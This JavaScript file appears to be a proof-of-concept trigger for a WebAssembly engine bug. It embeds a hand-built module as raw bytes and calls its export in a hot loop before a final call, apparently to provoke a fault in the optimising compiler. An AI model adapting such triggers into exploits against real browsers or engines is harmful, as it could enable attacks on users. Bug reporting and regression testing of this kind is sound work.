const wasmCode = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x10, 0x04, 0x5f,
    0x01, 0x5f, 0x60, 0x01, 0x6c, 0x00, 0x00, 0x60, 0x01, 0x6d, 0x00, 0x00,
    0x60, 0x01, 0x7f, 0x00, 0x03, 0x03, 0x02, 0x01, 0x03, 0x04, 0x04, 0x01,
    0x70, 0x00, 0x01, 0x07, 0x08, 0x01, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00,
    0x01, 0x09, 0x07, 0x01, 0x00, 0x41, 0x00, 0x0b, 0x01, 0x00, 0x0a, 0x0b,
    0x02, 0x02, 0x00, 0x0b, 0x07, 0x00, 0xd0, 0x00, 0x41, 0x00, 0x11, 0x02,
    0x00, 0x0b
]);

function poc(trigger_func, val) {
    try {
        trigger_func(val);
    } catch (e) {
    }
}

const wasmModule = new WebAssembly.Module(wasmCode);
const wasmInstance = new WebAssembly.Instance(wasmModule);
const hot_func = wasmInstance.exports.main;

for (let i = 0; i < 100; i++) {
    poc(hot_func, i);
}

poc(hot_func, 101);